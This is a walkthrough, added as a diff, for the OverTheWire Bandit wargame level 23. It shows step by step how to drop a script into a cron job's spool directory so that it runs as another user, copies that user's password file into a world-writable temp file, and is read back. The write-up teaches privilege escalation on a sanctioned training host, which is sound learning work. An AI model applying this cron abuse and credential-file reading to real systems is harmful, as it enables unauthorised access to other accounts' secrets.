@@ -1,0 +1,53 @@
+Bandit Level 23
+
+Goal:
+Create a shell script that will be executed by a cron job running as bandit24, so that it copies the password for the next level into a location you can read.
+
+Steps:
+
+ssh bandit23@bandit.labs.overthewire.org -p 2220
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+
+
+The cron job runs as bandit24 and executes scripts found in
+/var/spool/bandit24/foo/ that are owned by bandit23, then deletes them.
+
+Create a temporary working directory:
+
+mktemp -d
+cd /tmp/tmp.XXXXXXXXXX
+
+
+Create a script to copy the password:
+
+cat > script.sh << 'EOF'
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.XXXXXXXXXX/password.txt
+chmod 666 /tmp/tmp.XXXXXXXXXX/password.txt
+EOF
+
+
+(Replace /tmp/tmp.XXXXXXXXXX with your actual directory.)
+
+Make the script executable:
+
+chmod 777 script.sh
+chmod 777 /tmp/tmp.XXXXXXXXXX
+
+
+Copy the script to the cron execution directory:
+
+cp script.sh /var/spool/bandit24/foo/
+
+
+Wait up to one minute for cron to execute, then read the password:
+
+cat password.txt
+
+
+Result:
+The password for Bandit Level 24 was successfully obtained.
+
+Learning:
+Learned how cron jobs execute user-owned scripts, how to write a basic shell script, and how file ownership and permissions affect automated execution.
